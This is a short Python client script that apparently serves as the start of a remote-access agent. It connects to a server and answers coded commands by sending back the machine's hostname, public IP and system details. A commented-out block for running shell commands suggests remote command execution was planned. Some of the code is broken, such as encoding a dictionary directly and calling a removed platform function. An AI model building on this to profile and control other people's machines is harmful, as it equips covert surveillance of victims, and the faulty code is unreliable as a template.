import socket
import threading
import subprocess
import platform
import socket

def get_device_info():
    device_name = socket.gethostname()
    operating_system = platform.system()
    architecture = platform.architecture()
    processor = platform.processor()
    machine = platform.machine()

    try:
        # Additional information for Linux and macOS
        if operating_system == 'Linux':
            distribution = platform.linux_distribution()
            dist_name = distribution[0] if distribution else 'Unknown'
        elif operating_system == 'Darwin':
            dist_name = 'macOS'
        else:
            dist_name = 'N/A'

    except Exception as e:
        dist_name = 'N/A'

    device_info = {
        "Device Name": device_name,
        "Operating System": operating_system,
        "Distribution/Version": dist_name,
        "Architecture": architecture[0],
        "Processor": processor,
        "Machine": machine,
    }

    return device_info


# # Example: Run 'ipconfig' command in Windows CMD
# command = 'cmd'

# # Use subprocess.run to execute the command
# result = subprocess.run(command, shell=True, capture_output=True, text=True)

# # Check the output and return code
# if result.returncode == 0:
#     print("Command executed successfully.")
#     print("Output:")
#     print(result.stdout)
# else:
#     print("Error executing the command.")
#     print("Error Output:")
#     print(result.stderr)


# Connecting To Server
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 55555))

def get_public_ip():
    import requests
    response = requests.get('https://httpbin.org/ip')
    return response.json().get('origin')


# Listening to Server and Sending Nickname
def receive():
    while True:
        try:
            # Receive Message From Server
            # If 'NICK' Send Nickname
            message = client.recv(1024).decode('ascii')
            if message == 'DEVICE_!_NAME':
                client.send(socket.gethostname().encode('ascii'))
            elif message == 'I_P':
                client.send(get_public_ip().encode('ascii'))
            elif message == 'INFO':
                client.send(get_device_info().encode('ascii'))
            # elif message == '':
            #     pass
            # elif message == '':
            #     pass
            else:
                print(message)
        except Exception as e:
            # Close Connection When Error
            print("An error occured!")
            print(e)
            client.close()
            break
        
# Sending Messages To Server
def write():
    while True:
        message = '{}: {}'.format(socket.gethostname(), input(''))
        client.send(message.encode('ascii'))
        
# Starting Threads For Listening And Writing
receive_thread = threading.Thread(target=receive)
receive_thread.start()

write_thread = threading.Thread(target=write)
write_thread.start()